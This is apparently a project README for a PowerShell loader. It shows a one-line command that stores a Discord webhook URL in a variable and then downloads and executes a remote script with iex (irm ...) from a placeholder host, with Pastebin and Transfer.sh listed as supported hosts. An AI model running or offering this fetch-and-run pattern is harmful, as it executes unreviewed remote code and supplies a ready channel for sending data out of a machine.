<div align="center">


<h1 align="center">PowerShell Discord Webhook Loader</h1>

<p align="center">
  <strong>A minimal remote PowerShell loader that lets you run scripts via <code>iex (irm ...)</code> and pass a Discord Webhook as a variable without any extra tools.</strong>
</p>

![status](https://img.shields.io/badge/status-stable-brightgreen)
![powershell](https://img.shields.io/badge/PowerShell-iex%20%2B%20irm-blue)
![license](https://img.shields.io/badge/license-MIT-lightgrey)

</div>

---

## Features

- Run remote PowerShell scripts using `iex (irm "...")`
- Pass a Discord webhook through the `$WEBHOOK` variable
- No loaders, wrappers, or modules required
- Works on Windows PowerShell + PowerShell Core
- Supports any RAW file host

---

## Quick Guide how to use

Set your webhook and run the remote script:

```powershell
$WEBHOOK="https://discord.com/api/webhooks/XXXX/XXXX"; iex (irm "https://your-host/raw/script.ps1")
```

Your remote script instantly has access to `$WEBHOOK`.


---

## Supported RAW Hosts

- GitHub Raw  
- Pastebin Raw  
- Transfer.sh  
- Any host returning plain text  

---

MIT License. See `LICENSE` for details.
